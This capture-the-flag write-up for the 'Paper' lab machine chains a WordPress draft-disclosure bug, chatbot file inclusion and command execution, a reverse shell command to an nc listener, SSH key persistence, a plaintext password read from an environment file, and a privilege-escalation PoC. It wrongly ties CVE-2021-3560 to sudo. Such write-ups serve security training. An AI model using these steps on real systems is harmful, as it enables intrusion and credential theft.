## Exploit

This version of WordPress is vulnerable to CVE-2019-17671, "WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts", which is [trivially exploitable](https://www.exploit-db.com/exploits/47690).

<http://office.paper/?static=1> reveals:

Micheal please remove the secret from drafts for gods sake!

Hello employees of Blunder Tiffin,

Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.

So, I kindly request you all to take your discussions from the public blog to a more private chat system.

-Nick

## Warning for Michael

Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick

## Secret Registration URL of new Employee chat system

## I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.

## Also, stop looking at my drafts. Jeez!

Using the revealed URL `http://chat.office.paper/register/8qozr226AhkCHZdyY` I registered a user "dwight" and got access to the group chat. I find a chatbot called `recyclops`, running [hubot](https://github.com/hubotio/hubot) code:

![](_/htb-paper-20231012-3.png)

Easy LFI:

![](_/htb-paper-20231012-4.png)

After trying to escape the chatbot's `list` and `file` input sanitization, I discover a more direct way to execute commands:

```text
- <!=====Contents of file ../../../..//home/dwight/hubot/scripts/run.js=====>
    
- // Description:  
    // Runs a command on hubot  
    // TOTAL VIOLATION of any and all security!  
    //  
    // Commands:  
    // hubot run <command> - runs a command on hubot host  
      
    module.exports = function(robot) {  
    robot.respond("/RUN (.*)$/i", function(msg) {  
    console.log(msg);  
    var cmd = msg.match[1];  
    msg.send("Running " + cmd);  
    var exec = require('child_process').exec;  
    exec(cmd, function(error, stdout, stderr) {  
    if (error) {  
    msg.send(error);  
    msg.send(stderr);  
    } else {  
    msg.send(stdout);  
    }  
    });  
    });  
    };
    
- <!=====End of file ../../../..//home/dwight/hubot/scripts/run.js=====>
```

It works just fine:

```text
- run id
    
- ![](http://chat.office.paper/avatar/recyclops)
    
    recyclopsBot12:59 PM
    
    Running id
    
- Running id
    
- uid=1004(dwight) gid=1004(dwight) groups=1004(dwight)
```

```text
-   
    Running cat ~/user.txt
    
- eb01bf[...]
```

I use the same mechanism to run a reverse shell (`sh -i >& /dev/tcp/10.10.16.5/443 0>&1`) back to my `nc` listener:

```console
$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.143] 40934
sh: cannot set terminal process group (1663): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ id
id
uid=1004(dwight) gid=1004(dwight) groups=1004(dwight)
sh-4.4$ 
```

To gain `ssh` access, I add my public key to `~/.ssh/authorized_keys`:

```text
pwd
/home/dwight/.ssh
echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHrYUfv/qSFTn/e0f+C8yrOtzaJh7gq3ugnPVrTMHK2V e@k > authorized_keys
```

And login:

```console
$ ssh dwight@${t}
The authenticity of host '10.10.11.143 (10.10.11.143)' can't be established.
ED25519 key fingerprint is SHA256:9utZz963ewD/13oc9IYzRXf6sUEX4xOe/iUaMPTFInQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.143' (ED25519) to the list of known hosts.
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
[dwight@paper ~]$ 
```

## Escalate

I find an environment file with a password by grepping around:

```console
[dwight@paper ~]$ cat hubot/.env 
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1

```

This gives me the password for user `dwight`, but unfortunately that user has no `sudo` privileges.

I don't find any interesting `setuid` binaries.

Eventually I discover that the version of `sudo` on the machine is vulnerable to [CVE-2021-3560](https://www.exploit-db.com/exploits/50011). There's a PoC available. The exploit allows adding a new user with `sudo` access.

```console
[dwight@paper ~]$ ./poc.sh  -u=luser

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for luser: 
[root@paper luser]# id
